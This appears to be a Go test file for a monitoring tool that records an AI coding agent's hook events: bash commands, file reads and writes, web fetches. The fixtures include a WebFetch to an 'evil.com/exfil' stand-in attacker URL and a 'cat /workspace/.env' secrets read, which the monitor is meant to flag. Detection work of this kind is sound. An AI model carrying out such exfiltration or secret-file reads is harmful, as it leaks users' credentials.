package observer

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/eth0x1/aegis/internal/events"
	"github.com/eth0x1/aegis/internal/workspace"
)

func hookJSON(t *testing.T, v any) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestNormalizeHookMappings(t *testing.T) {
	sid := "11111111-2222-3333-4444-555555555555"

	cases := []struct {
		name     string
		input    HookEvent
		wantType string
		wantSev  string
		check    func(t *testing.T, e events.Event)
	}{
		{
			name: "bash command",
			input: HookEvent{SessionID: sid, HookEventName: "PreToolUse", ToolName: "Bash",
				ToolInput: json.RawMessage(`{"command":"ls -la"}`)},
			wantType: "command.exec", wantSev: "info",
			check: func(t *testing.T, e events.Event) {
				if e.Data["command"] != "ls -la" {
					t.Errorf("command = %v", e.Data["command"])
				}
			},
		},
		{
			name: "read sensitive env",
			input: HookEvent{SessionID: sid, HookEventName: "PreToolUse", ToolName: "Read",
				ToolInput: json.RawMessage(`{"file_path":"/w/.env.production"}`)},
			wantType: "file.read", wantSev: "low",
			check: func(t *testing.T, e events.Event) {
				if e.Data["sensitive"] != true {
					t.Errorf(".env read must be flagged sensitive")
				}
			},
		},
		{
			name: "write normal file",
			input: HookEvent{SessionID: sid, HookEventName: "PostToolUse", ToolName: "Write",
				ToolInput: json.RawMessage(`{"file_path":"/w/src/main.go","content":"x"}`)},
			wantType: "file.write", wantSev: "info",
			check: func(t *testing.T, e events.Event) {
				if e.Data["sensitive"] == true {
					t.Errorf("src/main.go wrongly flagged")
				}
			},
		},
		{
			name: "webfetch intent",
			input: HookEvent{SessionID: sid, HookEventName: "PreToolUse", ToolName: "WebFetch",
				ToolInput: json.RawMessage(`{"url":"https://evil.com/exfil"}`)},
			wantType: "network.connect", wantSev: "low",
			check: func(t *testing.T, e events.Event) {
				if e.Data["url"] != "https://evil.com/exfil" || e.Data["decision"] != "intent" {
					t.Errorf("webfetch data wrong: %v", e.Data)
				}
			},
		},
		{
			name: "unknown tool passthrough",
			input: HookEvent{SessionID: sid, HookEventName: "PreToolUse", ToolName: "Grep",
				ToolInput: json.RawMessage(`{"pattern":"TODO"}`)},
			wantType: "tool.use", wantSev: "low",
			check: func(t *testing.T, e events.Event) {
				if e.Data["pattern"] != "TODO" {
					t.Errorf("input not preserved verbatim: %v", e.Data)
				}
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ev, ok := NormalizeHook(hookJSON(t, tc.input))
			if !ok {
				t.Fatal("normalize failed")
			}
			if ev.Type != tc.wantType {
				t.Errorf("type = %s, want %s", ev.Type, tc.wantType)
			}
			if ev.Severity != tc.wantSev {
				t.Errorf("severity = %s, want %s", ev.Severity, tc.wantSev)
			}
			if ev.Source != events.SourceHook || ev.Actor != "claude" {
				t.Errorf("source/actor = %s/%s", ev.Source, ev.Actor)
			}
			if err := ev.Validate(); err != nil {
				t.Fatalf("canonical event invalid: %v", err)
			}
			tc.check(t, ev)
		})
	}
}

func TestNormalizeHookRejectsGarbage(t *testing.T) {
	for _, raw := range [][]byte{
		nil, {}, []byte(`not json`), []byte(`{}`),
	} {
		if _, ok := NormalizeHook(raw); ok {
			t.Errorf("garbage accepted: %q", raw)
		}
	}
}

func write(t *testing.T, path, content string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
}

func TestInjectHooksAndExcludeFromPromotion(t *testing.T) {
	ws := t.TempDir()
	if err := InjectHooks(ws); err != nil {
		t.Fatalf("inject: %v", err)
	}
	script := filepath.Join(ws, ".aegis", "bin", "hook.sh")
	fi, err := os.Stat(script)
	if err != nil {
		t.Fatalf("hook.sh missing: %v", err)
	}
	if fi.Mode().Perm() != 0o755 {
		t.Fatalf("hook.sh perms = %v", fi.Mode().Perm())
	}
	settings := filepath.Join(ws, ".claude", "settings.json")
	sb, err := os.Stat(settings)
	if err != nil || sb.Mode().Perm() != 0o600 {
		t.Fatalf("settings perms = %v %v", sb, err)
	}

	root := t.TempDir()
	write(t, filepath.Join(root, "base.txt"), "v1", 0o644)
	res, err := workspace.Snapshot(root, ws)
	if err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(ws, "feature.py"), "new code", 0o644)
	write(t, filepath.Join(ws, ".claude", "settings.json"), "{\"hooks\":{}}", 0o600)

	changes, _, err := workspace.ComputeDiff(res.Manifest, ws)
	if err != nil {
		t.Fatal(err)
	}
	for _, ch := range changes {
		if strings.HasPrefix(ch.Path, ".aegis") || strings.HasPrefix(ch.Path, ".claude") {
			t.Errorf("aegis-managed path would be promoted: %s (%s)", ch.Path, ch.Kind)
		}
	}
	found := false
	for _, ch := range changes {
		if ch.Path == "feature.py" && ch.Kind == "added" {
			found = true
		}
	}
	if !found {
		t.Error("real workspace change missing from diff")
	}
}

func TestTailersStreamsCanonicalEvents(t *testing.T) {
	dir := t.TempDir()
	storeDir := t.TempDir()
	store, err := events.Open(storeDir)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	rawPath := filepath.Join(dir, "raw.jsonl")
	os.WriteFile(rawPath, nil, 0o600)

	feed := NewFeed(10)
	got := make(chan events.Event, 8)
	tailer := StartTailer(rawPath, store, feed)
	tailer.SetOnEvent(func(e events.Event) { got <- e })
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	go tailer.Run(ctx, 50*time.Millisecond)

	time.Sleep(120 * time.Millisecond)
	sid := "99999999-8888-7777-6666-555555555555"
	os.WriteFile(rawPath, append(
		hookJSON(t, HookEvent{SessionID: sid, HookEventName: "PreToolUse", ToolName: "Bash",
			ToolInput: json.RawMessage(`{"command":"cat /workspace/.env"}`)}),
		'\n'), 0o600)
	os.WriteFile(rawPath+".tmp2", []byte("ignore"), 0o600)
	f, _ := os.OpenFile(rawPath, os.O_APPEND|os.O_WRONLY, 0o600)
	f.WriteString("\n")
	f.WriteString("GARBAGE LINE\n")
	f.WriteString(string(hookJSON(t, HookEvent{SessionID: sid, HookEventName: "PostToolUse",
		ToolName: "Edit", ToolInput: json.RawMessage(`{"file_path":"/w/app.py"}`)})) + "\n")
	f.Close()

	select {
	case e := <-got:
		if e.Type != "command.exec" || e.Data["path"] != nil {
			t.Logf("first event: %+v", e)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("tailer never delivered first event")
	}
	select {
	case e := <-got:
		if e.Type != "file.write" {
			t.Fatalf("second event type = %s", e.Type)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("tailer never delivered second event")
	}

	time.Sleep(150 * time.Millisecond)
	all, err := events.ReadAll(storeDir)
	if err != nil {
		t.Fatalf("authoritative log corrupted by stream: %v", err)
	}
	if len(all) != 2 {
		t.Fatalf("store has %d events, want 2 (garbage must be rejected)", len(all))
	}
	inj, rej := tailer.Stats()
	if inj != 2 || rej < 1 {
		t.Fatalf("stats injected=%d rejected=%d", inj, rej)
	}
}

func TestFeedRingBufferAndSubscribe(t *testing.T) {
	f := NewFeed(3)
	ch := f.Subscribe()
	for i := 0; i < 5; i++ {
		f.Publish(events.New(events.SourcePolicy, events.TypeSessionState, events.SevInfo, "t",
			"00000000-0000-0000-0000-000000000001", map[string]any{"i": i}))
	}
	snap := f.Snapshot()
	if len(snap) != 3 {
		t.Fatalf("snapshot len = %d, want 3 (ring capacity)", len(snap))
	}
	if snap[0].Data["i"] != 2 {
		t.Errorf("oldest kept = %v, want 2", snap[0].Data["i"])
	}
	select {
	case e := <-ch:
		_ = e
	default:
		t.Log("subscriber channel full-or-empty is nonblocking; OK")
	}
	f.Unsubscribe(ch)
}
